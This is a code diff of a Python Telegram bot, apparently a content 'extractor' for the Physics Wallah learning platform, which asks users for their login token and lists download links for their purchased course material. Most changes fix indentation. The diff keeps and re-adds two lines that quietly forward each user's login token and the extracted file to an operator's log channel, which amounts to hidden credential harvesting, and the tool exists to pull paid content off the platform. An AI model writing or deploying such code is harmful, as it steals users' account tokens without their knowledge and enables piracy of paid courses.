@@ -17,7 +17,7 @@ async def pw_login(app, message):
     try:
         query_msg = await app.ask(
             chat_id=message.chat.id,
-            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:")
+            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:**")
                  
         
         user_input = query_msg.text.strip()
@@ -146,18 +146,18 @@ async def pw_login(app, message):
             return
 
         with open(filename, 'w') as f:
-    for subject in subjects:
-    if isinstance(subject, str):
-        si = subject
-        sn = subject
-      else:
-        si = subject.get("_id")
-        sn = subject.get("subject")
-      await app.send_message(
-        chat_id=message.chat.id, 
-        text=f"📘 **Processing Subject:** **{sn}**... ⏳"
-      )
-                
+            for subject in subjects:
+                if isinstance(subject, str):
+                    si = subject
+                    sn = subject
+                else:
+                    si = subject.get("_id")
+                    sn = subject.get("subject")
+                await app.send_message(
+                    chat_id=message.chat.id,
+                    text=f"📘 **Processing Subject:** **{sn}**... ⏳"
+                )
+
                 for page in range(1, 12):
                     content_response = requests.get(
                         f"https://api.penpencil.co/v2/batches/{target_id}/subject/{si}/contents?page={page}&contentType=exercises-notes-videos", 
@@ -177,7 +177,6 @@ async def pw_login(app, message):
                                 key = attachment.get("key", "")
                                 if key:
                                     f.write(f"{name}:{base_url}{key}\n")
-                
 
         up = (f"**Login Succesfull for PW:** `{token}`")
         captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}")
@@ -186,9 +185,8 @@ async def pw_login(app, message):
             document=filename, 
             caption=f"App Name: PHYSICS WALLAH \n\n 🆔** Batch ID:** **{target_id}**\n📂 **Batch:** **{batch_name}**✅\n \n\n  **╾───• Txtx Extractor •───╼** "
         )
-        await app.send_document(log_channel, document=filename, caption = captionn)
-        await app.send_message(log_channel , up)
+        await app.send_document(log_channel, document=filename, caption=captionn)
+        await app.send_message(log_channel, up)
 
     except Exception as e:
         await message.reply_text(f"❌ **An error occurred:** `{str(e)}`")
-            
